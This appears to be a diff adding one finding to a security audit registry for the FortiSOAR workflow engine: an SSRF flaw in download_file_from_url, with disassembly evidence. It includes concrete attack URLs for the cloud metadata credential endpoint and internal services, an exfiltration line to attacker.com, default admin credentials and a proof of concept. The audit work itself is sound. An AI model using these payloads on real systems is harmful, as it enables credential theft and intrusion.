@@ -2533,3 +2533,104 @@ FSR_F37_CREATE_FILE_FROM_STRING_UNGUARDED_WRITE = {
         "No sanitization between kwarg extraction and file open."
     ),
 }
+
+# ---------------------------------------------------------
+# FSR-F38 -- download_file_from_url SSRF (no URL validation)
+# ---------------------------------------------------------
+FSR_F38_DOWNLOAD_FILE_FROM_URL_SSRF = {
+    "id": "FSR-F38",
+    "title": "download_file_from_url passes URL raw to requests -- SSRF with internal network access",
+    "severity": "HIGH",
+    "cvss": "8.6",
+    "cvss_vector": "AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:N/A:N",
+    "cwe": "CWE-918",
+    "component": "cyops-workflow (builtins/files.so -- download_file_from_url + download_file)",
+    "binary": "/opt/cyops-workflow/sealab/workflow/builtins/files.so",
+    "disasm_evidence": {
+        "outer_func": "files.so VA 0x10570 (__pyx_pw_..._1download_file_from_url, 6820B)",
+        "inner_func": "files.so VA 0x2dff0 (__pyx_pw_..._9download_file, 22018B)",
+        "url_kwarg": (
+            "download_file_from_url BSS ref: [0x23cea8] = __pyx_n_s_url\n"
+            "  -> function takes caller-supplied 'url' kwarg\n"
+            "  -> passed directly to download_file (call rbp at 0x10b20) with no mutation"
+        ),
+        "validation_absent": (
+            "download_file_from_url BSS scan (6820B): zero refs to\n"
+            "  __pyx_n_s_urlparse, __pyx_n_s_netloc, __pyx_n_s_scheme,\n"
+            "  __pyx_n_s_check_file_traversal, any IP blocklist, any allowlist\n"
+            "download_file BSS scan (22018B): same -- zero refs to urlparse, netloc, scheme"
+        ),
+        "arbitrary_iri_log": (
+            "download_file BSS ref: [0x23d2a0] = __pyx_kp_u_download_file_from_arbitrary_iri\n"
+            "  -> function's own log prefix contains 'arbitrary_iri'\n"
+            "  -> developers documented it downloads from ARBITRARY IRI -- no restriction intended"
+        ),
+        "http_dispatch": (
+            "download_file BSS refs:\n"
+            "  [0x23cf98] = __pyx_n_s_requests   ; uses 'requests' library\n"
+            "  [0x23ce58] = __pyx_n_u_verify      ; verify= kwarg (SSL verification)\n"
+            "  [0x23cee8] = __pyx_n_u_stream      ; stream=True for response streaming\n"
+            "  [0x23d410] = __pyx_n_u_auth        ; auth= kwarg passed through\n"
+            "  [0x23d108] = __pyx_n_s_iri         ; IRI support (internationalized URLs)"
+        ),
+        "response_handling": (
+            "download_file BSS refs:\n"
+            "  [0x23cf00] = __pyx_n_u_status_code ; reads response.status_code\n"
+            "  [0x23d018] = __pyx_n_s_ok          ; checks response.ok\n"
+            "  [0x23d378] = __pyx_n_s_content     ; reads response.content\n"
+            "  [0x23d3f8] = __pyx_n_s_basename    ; extracts filename from URL\n"
+            "  [0x23d000] = __pyx_n_s_parse_header; parses Content-Disposition header\n"
+            "  [0x23d1e0] = __pyx_n_s_file_hash_calculator ; md5/sha1/sha256 of response"
+        ),
+        "save_file_in_env": (
+            "download_file_from_url BSS ref: [0x23cf60] = __pyx_n_s_save_file_in_env\n"
+            "  -> after download, calls save_file_in_env with response content\n"
+            "  -> save_file_in_env (0xe740, 5221B): zero refs to TMP_FILE_ROOT, join, open, write\n"
+            "  -> save_file_in_env updates FortiSOAR environment context (metadata tracker, not file writer)"
+        ),
+    },
+    "attack_scenarios": [
+        (
+            "Cloud metadata SSRF (AWS/Azure/GCP):\n"
+            "  url = 'http://169.254.169.254/latest/meta-data/iam/security-credentials/'\n"
+            "  Result: IAM credentials returned in playbook output"
+        ),
+        (
+            "Internal service enumeration:\n"
+            "  url = 'http://localhost:5432/'  ; PostgreSQL\n"
+            "  url = 'http://localhost:15672/'  ; RabbitMQ management UI\n"
+            "  url = 'http://localhost:9200/'  ; Elasticsearch\n"
+            "  Result: banner/version data from internal services not exposed externally"
+        ),
+        (
+            "Internal API abuse:\n"
+            "  url = 'http://127.0.0.1:8080/internal-admin/reset-password'\n"
+            "  Result: authenticated caller can invoke internal APIs as the cyops-workflow process user"
+        ),
+        (
+            "OOB data exfiltration:\n"
+            "  url = 'http://attacker.com/?data='+base64(secret)\n"
+            "  Response content returned to playbook output -> exfiltrated"
+        ),
+    ],
+    "chain": [
+        "FSR-F38 + FSR-F4 (csadmin:changeme): unauthenticated -> admin -> SSRF -> internal API access",
+        "FSR-F38 + cloud deployment: authenticated user -> steal IAM credentials -> cloud account takeover",
+        "FSR-F38 + FSR-F37: SSRF to enumerate internal port, F37 to write backdoor once port mapped",
+        "FSR-F38 standalone: authenticated playbook user -> internal network recon",
+    ],
+    "precondition": "Authenticated user with playbook create/edit permission; 'Download File From URL' step available.",
+    "poc": (
+        "Playbook step: Download File From URL\n"
+        "  url: 'http://169.254.169.254/latest/meta-data/iam/security-credentials/'\n"
+        "Result: AWS IAM credential JSON returned in step output."
+    ),
+    "status": (
+        "CONFIRMED via BSS scan of download_file_from_url (0x10570, 6820B) and "
+        "download_file (0x2dff0, 22018B). "
+        "Both functions: zero refs to urlparse, netloc, scheme, or any URL validation. "
+        "download_file BSS string __pyx_kp_u_download_file_from_arbitrary_iri confirms "
+        "intentional arbitrary-IRI design -- no scheme or host restriction. "
+        "requests library used for HTTP dispatch; IRI parameter also supported."
+    ),
+}
